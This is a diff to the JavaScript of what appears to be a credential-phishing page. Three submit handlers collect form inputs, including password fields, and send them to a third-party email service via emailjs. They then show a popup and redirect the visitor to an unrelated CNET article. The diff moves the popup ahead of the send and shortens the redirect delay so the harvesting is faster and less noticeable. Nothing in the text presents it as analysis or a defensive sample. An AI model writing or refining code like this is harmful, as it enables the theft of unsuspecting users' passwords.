@@ -61,12 +61,12 @@ sub1.addEventListener('click',()=>{
               password:input[1].value
           }
           console.log(params);
+          document.getElementsByClassName("popup")[0].classList.add('scale')
           emailjs.send(servicerID,tempID,params).then(
             function (res){
-                document.getElementsByClassName("popup")[0].classList.add('scale')
                   setTimeout(()=>{
                      window.location.href="https://www.cnet.com/tech/computing/plug-versus-plug/"
-               },4000)
+               },1000)
                }
                 )
       }
@@ -89,12 +89,12 @@ sub2.addEventListener('click',()=>{
           }
          console.log(params);
          
+         document.getElementsByClassName("popup")[0].classList.add('scale')
           emailjs.send(servicerID,tempID,params).then(
               function (res){
-               document.getElementsByClassName("popup")[0].classList.add('scale')
                  setTimeout(()=>{
                     window.location.href="https://www.cnet.com/tech/computing/plug-versus-plug/"
-              },4000)
+              },1000)
               }
                 )
       }
@@ -114,12 +114,12 @@ sub3.addEventListener('click',()=>{
               password:input[5].value
           }
           console.log(params);
+          document.getElementsByClassName("popup")[0].classList.add('scale')
           emailjs.send(servicerID,tempID,params).then(
             function (res){
-                document.getElementsByClassName("popup")[0].classList.add('scale')
                   setTimeout(()=>{
                      window.location.href="https://www.cnet.com/tech/computing/plug-versus-plug/"
-               },4000)
+               },1000)
                }
                 )
       }
